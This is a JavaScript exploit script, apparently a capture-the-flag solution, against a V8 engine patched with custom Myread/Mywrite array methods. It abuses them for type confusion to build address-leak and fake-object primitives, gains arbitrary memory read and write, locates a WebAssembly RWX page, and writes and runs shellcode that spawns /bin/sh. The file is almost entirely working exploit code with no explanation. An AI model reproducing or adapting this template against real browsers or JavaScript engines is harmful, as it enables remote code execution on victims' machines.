// var a = [1, 2, 3, 4];
// var data = a.Myread();
// %DebugPrint(a);
// %SystemBreak();
// console.log("[*] Myread return data: "+data.toString())
// a.Mywrite(2);
// %DebugPrint(a);
// %SystemBreak();

var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
// %DebugPrint(obj);
// %DebugPrint(obj_array);
// %DebugPrint(float_array);
// %SystemBreak();
var obj_array_map = obj_array.Myread();
var float_array_map = float_array.Myread();
// %DebugPrint(obj_array_map);
// %DebugPrint(float_array_map);
// %SystemBreak();

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var biguint64 = new BigUint64Array(buf);

function f2i(f){
    float64[0] = f;
    return biguint64[0];
}

function i2f(i){
    biguint64[0] = i;
    return float64[0];
}

function hex(i){
    return i.toString(16).padStart(16, "0");
}

function leakAddr(obj){
    obj_array[0] = obj;
    obj_array.Mywrite(float_array_map);
    let obj_addr = f2i(obj_array[0])-1n;
    obj_array.Mywrite(obj_array_map);
    return obj_addr;
}

function fakeObject(addr_to_fake){
    float_array[0] = i2f(addr_to_fake + 1n);
    float_array.Mywrite(obj_array_map);
    let fake_obj = float_array[0];
    float_array.Mywrite(float_array_map);
    return fake_obj;
}

var fake_array = [
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),
    i2f(0x100000000n),
    1.1,
    2.2
];

var fake_array_addr = leakAddr(fake_array);
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr){
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    let leak_data = f2i(fake_object[0]);
    console.log("[+] leak addr: 0x" + hex(addr) + " of map: 0x" + hex(leak_data));
    return leak_data;
}
function write64(addr, data){
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    fake_object[0] = i2f(data);
    console.log("[+] write to: 0x" + hex(addr) + ": 0x" + hex(data));
}

function copy_shellcode_to_rwx(shellcode, rwx_addr){
    var data_buf = new ArrayBuffer(shellcode.length*8);
    var data_view = new DataView(data_buf);
    var buf_backing_store_addr = leakAddr(data_buf) + 0x20n;
    console.log("[+] buf_backing_store_addr: 0x" + hex(buf_backing_store_addr));

    write64(buf_backing_store_addr, rwx_addr);
    for(let i = 0; i < shellcode.length; i++){
        data_view.setFloat64(i*8, i2f(shellcode[i]), true);
    }
}

let pwn = () => {
    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,
                                    128,0,1,96,0,1,127,3,130,128,128,128,
                                    0,1,0,4,132,128,128,128,0,1,112,0,0,5,
                                    131,128,128,128,0,1,0,1,6,129,128,128,128,
                                    0,0,7,145,128,128,128,0,2,6,109,101,109,111,
                                    114,121,2,0,4,109,97,105,110,0,0,10,142,128,128,
                                    128,0,1,136,128,128,128,0,0,65,239,253,182,245,125,11]);
    var wasm_module = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_module);
    var func = wasm_instance.exports.main;
    var wasm_instance_addr = leakAddr(wasm_instance)
    var func_addr = leakAddr(func);
    var rwx_addr = read64(wasm_instance_addr + 0x88n) + 1n;
    // %DebugPrint(func);
    // %SystemBreak();
    console.log("[+] func_addr: 0x" + hex(func_addr));
    console.log("[+] wasm_instance_addr: 0x" + hex(wasm_instance_addr));
    console.log("[+] rwx_addr: 0x" + hex(rwx_addr));

    var shellcode = [
        0x2fbb485299583b6an,
        0x5368732f6e69622fn,
        0x050f5e5457525f54n
    ]

    copy_shellcode_to_rwx(shellcode, rwx_addr);

    func()

}
pwn();
// %SystemBreak();